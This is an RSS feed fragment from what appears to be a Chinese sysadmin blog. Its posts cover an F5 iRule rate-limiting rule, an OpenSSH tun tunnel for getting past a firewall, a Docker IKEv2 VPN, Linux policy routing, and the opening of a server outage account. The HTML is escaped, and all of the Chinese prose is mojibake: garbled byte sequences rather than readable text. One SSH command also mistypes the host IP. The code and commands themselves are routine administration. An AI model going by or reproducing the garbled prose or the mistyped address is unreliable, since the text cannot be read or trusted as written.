&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;table keys -subtable &lt;span class=&#34;nv&#34;&gt;$tbl&lt;/span&gt; -count&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &amp;gt; &lt;span class=&#34;nv&#34;&gt;$myMaxRate&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    HTTP::respond &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Block&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ¥ä¸ªæ›´åŠ å¤æ‚çš„ä¾‹å­ï¼š&lt;/p&gt;
&lt;p&gt;POSTçš„è¯·æ±‚å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST /api/sendMessage.htm HTTP/1.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: &lt;span class=&#34;m&#34;&gt;203&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: application/x-www-form-urlencoded&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: 172.8.2.23  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connection: Keep-Alive  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User-Agent: Apache-HttpClient/4.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Java/1.7.0_51&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Accept-Encoding: gzip,deflate
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;order.sumit.order&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;jsonData&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;%7B%22channelCode%22%3A%22%22%2C%22mobiles%22%3A%5B%2215176989787%22%5D%2C%22source%22%3A%22pop%22%2C%22tempParameters%22%3A%5B%22480827%22%2C%2291%22%5D%2C%22templateId%22%3A2%7D  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬è¦é˜»æ­¢POST /api/sendMessage.htmä¸”action=sendmsgçš„è¯ï¼Œå°±æ¯”è¾ƒå¤æ‚ä¸€äº›ï¼Œæˆ‘ä»¬åˆ¤æ–­uriæ»¡è¶³æ¡ä»¶åï¼Œè¿˜è¦è¿›ä¸€æ­¥åˆ¤æ–­contentä¸­action=çš„å†…å®¹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”¨opensshçš„tunnelå»ºç«‹éš§é“ç¿»å¢™</title>
      <link>https://rendoumi.com/posts/20240111-openssh_tunnel/</link>
      <pubDate>Thu, 11 Jan 2024 14:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240111-openssh_tunnel/</guid>
      <description>&lt;p&gt;opensshæ˜¯æ”¯æŒéš§é“çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥åœ¨sshä¸­å†å¥—ä¸ªç®¡é“ï¼Œç›´æ¥ç”¨æ¥ç¿»å¢™ï¼Œåšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;å¦‚ä¸Šå›¾ï¼ŒAæœºèƒ½sshç™»å½•Bæœº&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Aæœºçš„IPï¼š172.16.8.106&lt;/p&gt;
&lt;p&gt;Bæœºçš„IPï¼š172.16.8.108&lt;/p&gt;
&lt;p&gt;Aæœºå»ºç«‹&lt;code&gt;tunnel&lt;/code&gt;åtunçš„ipï¼š192.168.244.1&lt;/p&gt;
&lt;p&gt;Bæœºå»ºç«‹&lt;code&gt;tunnel&lt;/code&gt;åtunçš„ipï¼š192.168.244.2&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;é¦–å…ˆç¼–è¾‘Aå’ŒBçš„/etc/ssh/sshd_configï¼Œå…è®¸tunnelï¼Œç¼ºçœæ˜¯ä¸å…è®¸çš„ï¼Œç„¶åservice sshd restart ï¼Œé‡å¯sshd&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PermitTunnel yes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Aå’ŒBå®‰è£…linuxä¸‹çš„tunè½¯ä»¶ï¼Œå¹¶å¯åŠ¨ä¸€ä¸ªtunnelè®¾å¤‡&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yum install tunctl  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tunctl -t tun5 -u root  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;åœ¨A(172.16.8.106)æœºå™¨ä¸Šç”Ÿæˆkeyï¼Œå¹¶è®¾ç½®èƒ½æ— å¯†ç è¯ä¹¦ç›´æ¥ç™»å½•B(172.16.8.108)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh-keygen  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh-copy-id root@172.16.8.108  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;åœ¨Aä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå»ºç«‹ssh tunnelï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -w 5:5 root@172.168.8.108  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;åœ¨Aä¸Šæ‰§è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;åœ¨Bä¸Šæ‰§è¡Œ&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;è¿™æ ·åˆ†åˆ«åœ¨Aå’ŒBä¸Šping 192.168.244.1å’Œ192.168.244.2ï¼Œéƒ½èƒ½é€šå°±è¡¨ç¤ºå·²ç»okäº†ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¼˜åŒ–ä¸€ä¸‹ï¼ŒAå’ŒBä¸¤è¾¹éƒ½å…ˆæŠŠtun5å¯åŠ¨ä»¥åï¼Œç›´æ¥åœ¨Aä¸Šä¸€å¥è¯æå®šï¼Œè¿™ä¸ªä¸ä¼šè‡ªåŠ¨é€€å‡ºï¼Œæ‰€ä»¥å¾—ctrl+zï¼Œç„¶åbgæ”¾åå°å»ï¼Œæˆ–è€…screenæŒ‚ä½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -o &lt;span class=&#34;nv&#34;&gt;PermitLocalCommand&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -o &lt;span class=&#34;nv&#34;&gt;LocalCommand&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ifconfig tun5 192.168.244.1 pointopoint 192.168.244.2 netmask 255.255.255.0&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -o &lt;span class=&#34;nv&#34;&gt;ServerAliveInterval&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -w 5:5 root@172.16.8.108 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;ifconfig tun5 192.168.244.2 pointopoint 192.168.244.1 netmask 255.255.255.0; echo tun5 ready&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœè¦ç”¨åœ¨ç¿»å¢™çš„ç¯å¢ƒï¼Œé‚£å°±å¾—ä¿æŒé•¿é“¾æ¥äº†ã€‚å‡è®¾Aæœºå™¨æ˜¯åœ¨ä¸€ä¸ªé˜²ç«å¢™åï¼Œä¸”è¢«NATäº†ï¼Œé‚£ä¹ˆå°±å¾—å…ˆè¿™æ ·æ‰“é€šéš§é“ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dockeræ€¥é€Ÿæ­å»ºè¿è¡Œikev2 vpnæ¥è®©iphoneç¿»å¢™</title>
      <link>https://rendoumi.com/posts/20240111-ikev2_docker/</link>
      <pubDate>Thu, 11 Jan 2024 13:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240111-ikev2_docker/</guid>
      <description>&lt;p&gt;è¿™ç¯‡æ–‡ç« åªé€‚ç”¨äºåœ¨è‡ªå·±çš„vpsä¸Šè¿è¡Œï¼š&lt;/p&gt;
&lt;p&gt;æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;1ã€æ‹‰å›æ¥é•œåƒï¼Œikev2-vpn-serverï¼Œè¯è¯´è¿™ä¹ˆå¤šå¹´è¿‡å»äº†ï¼Œä¾ç„¶é€‚ç”¨ï¼Œ2016å¹´åˆ°ç°åœ¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker pull gaomd/ikev2-vpn-server  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2ã€å¯åŠ¨æœåŠ¡ç«¯ï¼Œæ³¨æ„&amp;ndash;privilegedå‚æ•°ï¼Œè¿™ä¸ªæ˜¯å¿…é¡»çš„&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run --privileged -d --name ikev2-vpn-server --restart&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;always -p 500:500/udp -p 4500:4500/udp gaomd/ikev2-vpn-server:0.3.0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æå®šï¼Œåªéœ€è¦2æ­¥å³å¯å®Œæˆç›¸å¯¹æ¯”è¾ƒéš¾æçš„ikev2çš„å®‰è£….&lt;/p&gt;
&lt;p&gt;3ã€ç”Ÿæˆiphoneå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -i -t --rm --volumes-from ikev2-vpn-server -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;HOST=vpn.rendoumi.com&amp;#34;&lt;/span&gt; gaomd/ikev2-vpn-server:0.3.0 generate-mobileconfig &amp;gt; ikev2-vpn-ihone6s.mobileconfig  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼švpn.rendoumi.comæ›¿æ¢æˆä½ è‡ªå·±å¯¹åº”çš„ipæˆ–è€…åŸŸå&lt;/p&gt;
&lt;p&gt;ç„¶åä½ æŠŠè¿™ä¸ªé…ç½®æ–‡ä»¶ä¸‹è½½ï¼Œå®‰è£…åˆ°MacOSæˆ–è€…iOSä¸­ï¼Œå°±å¯ä»¥æ„‰å¿«çš„ç©è€äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹çš„ç­–ç•¥è·¯ç”±</title>
      <link>https://rendoumi.com/posts/20240110-route_policy/</link>
      <pubDate>Wed, 10 Jan 2024 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240110-route_policy/</guid>
      <description>&lt;p&gt;å¦‚æœæˆ‘ä»¬æœ‰ä¸¤æ¡ä¸Šç½‘çº¿è·¯å¯ä»¥ä½¿ç”¨ï¼Œé‚£ä¹ˆç­–ç•¥è·¯ç”±å°±æ˜¯ä¸ªå¥½çš„é€‰æ‹©äº†ã€‚&lt;/p&gt;
&lt;p&gt;åŸºæœ¬æ¦‚å¿µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç­–ç•¥è·¯ç”±è¡¨ï¼ˆPolicy routing tablesï¼‰: Linux ç¼ºçœæœ‰3ä¸ªè¡¨ï¼Œ  local (ä¸èƒ½æ”¹ä¹Ÿä¸èƒ½åˆ ), main, å’Œ defaultã€‚æ·»åŠ è·¯ç”±çš„æ—¶å€™å¦‚æœä¸æŒ‡å®šï¼Œç¼ºçœæ˜¯æ·»åŠ åˆ°&lt;code&gt;main&lt;/code&gt;è·¯ç”±è¡¨é‡Œçš„ã€‚&lt;/li&gt;
&lt;li&gt;ç­–ç•¥è·¯ç”±è§„åˆ™ï¼ˆPolicy routing rulesï¼‰: Linux ç¼ºçœä¹Ÿæœ‰ä¸‰å¥—è·¯ç”±è§„åˆ™ï¼Œå¯¹åº”ä¸‰ä¸ªç¼ºçœè·¯ç”±è¡¨ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æŸ¥çœ‹ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªè¡¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ip rule list&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0:    from all lookup &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;32766:    from all lookup main  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;32767:    from all lookup default  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥localè¡¨çš„è·¯ç”±è§„åˆ™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ip route list table local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; 10.10.0.1 dev tun0  proto kernel  scope host  src 10.10.0.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;broadcast 127.255.255.255 dev lo  proto kernel  scope link  src 127.0.0.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; 192.168.122.1 dev virbr0  proto kernel  scope host  src 192.168.122.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; 172.16.8.1 dev br0  proto kernel  scope host  src 172.16.8.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;broadcast 192.168.122.0 dev virbr0  proto kernel  scope link  src 192.168.122.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;broadcast 172.16.8.0 dev br0  proto kernel  scope link  src 172.16.8.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;broadcast 172.16.9.255 dev br0  proto kernel  scope link  src 172.16.8.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;broadcast 127.0.0.0 dev lo  proto kernel  scope link  src 127.0.0.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;broadcast 192.168.122.255 dev virbr0  proto kernel  scope link  src 192.168.122.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; 127.0.0.1 dev lo  proto kernel  scope host  src 127.0.0.1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; 127.0.0.0/8 dev lo  proto kernel  scope host  src 127.0.0.1  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨ç­–ç•¥è·¯ç”±çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œ1ã€å®šä¹‰ä¸€ä¸ªè·¯ç”±è¡¨ï¼Œ2ã€å®šä¹‰è·¯ç”±è§„åˆ™ï¼Œ3ã€åº”ç”¨è·¯ç”±è§„åˆ™ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>æœåŠ¡å™¨R920çš„ä¸€æ¬¡æ€¥é€Ÿæ•…éšœå¤„ç†</title>
      <link>https://rendoumi.com/posts/20240110-dell_restart/</link>
      <pubDate>Wed, 10 Jan 2024 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240110-dell_restart/</guid>
      <description>&lt;p&gt;è®°å½•ä¸€ä¸‹ï¼Œ2016å¹´çš„5æœˆ5æ—¥è¿™å¤©çš„ä¸­åˆã€‚&lt;/p&gt;
&lt;p&gt;æ­£åœ¨è·Ÿè€åˆ˜ã€å¤§äº®ã€Goodå®ä¸€èµ·åƒåˆé¥­ï¼Œçªç„¶æ‰‹æœºæ¥åˆ°çŸ­ä¿¡æŠ¥è­¦ï¼Œè¯´æ˜¯ä¸»æ•°æ®åº“Downäº†ã€‚å‡ºå¤§äº‹äº†ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯å¾ˆå¸¸è§çš„åœºæ™¯å§ï¼Œå¦‚ä½•åœ¨è¿™ç§æƒ…å†µä¸‹å¤„ç†æœåŠ¡å™¨æ•…éšœå‘¢ï¼ŸåŸºæœ¬åƒé¥­çš„æ—¶å€™æ˜¯ä¸ä¼šæºå¸¦ç¬”è®°æœ¬çš„ï¼Œæ‰€æœ‰çš„æ“ä½œåªèƒ½åœ¨æ‰‹æœºä¸Šå®Œæˆäº†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæ˜¯iphoneæ‰‹æœºï¼Œè£…ä¸Š&lt;code&gt;Termius&lt;/code&gt;ï¼›å¦‚æœæ˜¯androidæ‰‹æœºï¼Œè£…ä¸Š&lt;code&gt;Juicessh&lt;/code&gt;ã€‚è¿™ä¸¤ä¸ªéƒ½æ˜¯è¿œç¨‹sshè½¯ä»¶ï¼ˆæˆ‘ä»¬çš„æœåŠ¡å™¨éƒ½æ˜¯Linuxï¼Œæ²¡æœ‰Windowsï¼‰ã€‚å¦å¤–å…¬å¸æ˜¯æœ‰openvpnçš„ï¼Œå¿…é¡»é€šè¿‡vpnæ‰èƒ½è¿æ¥åˆ°IDCçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦æ‰‹æœºè£…ä¸Šopenvpnè½¯ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;æ‹¨é€švpnï¼Œç”¨sshè¿ä¸ŠæœåŠ¡å™¨ï¼Œç„¶åå¿«é€Ÿè¿è¡Œå®ç°ç¼–å†™å¥½çš„pingè„šæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat 1.ping.sh  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/sh&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping 172.8.&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªè„šæœ¬å¾ˆå¥‡æ€ªå§ï¼Œåå­—å«åš1.ping.shï¼Œæ˜¯å› ä¸ºåœ¨æ‰‹æœºä¸Šæ“ä½œï¼Œä¸€åˆ‡éƒ½è¦è¿…é€Ÿï¼ŒTermiuså’ŒJuicesshéƒ½æ˜¯æ”¯æŒå‘½ä»¤è¡¥å…¨çš„{tab}é”®çš„ï¼Œæ‰€ä»¥åªè¦è¾“å…¥./1{tab} 1.1 å°±ç­‰äºæ‰§è¡Œäº†ping 172.8.1.1ï¼Œä¸Šé¢åªè¾“å…¥äº†6ä¸ªå­—ç¬¦ï¼Œè€Œå®Œæ•´çš„pingå‘½ä»¤åˆ™éœ€è¦è¾“å…¥14ä¸ªå­—ç¬¦ï¼Œè¿™å°±æ˜¯åŸå› äº†ã€‚&lt;/p&gt;
&lt;p&gt;pingä¸€ä¸‹ä¸é€šï¼Œé‚£å°±èµ¶ç´§æ‰§è¡Œè„šæœ¬ï¼ŒæŠ“ä¸€ä¸‹æœåŠ¡å™¨idracå‰é¢æ¿çš„ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat 2.idrac.sh  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#!/bin/sh&lt;/span&gt;
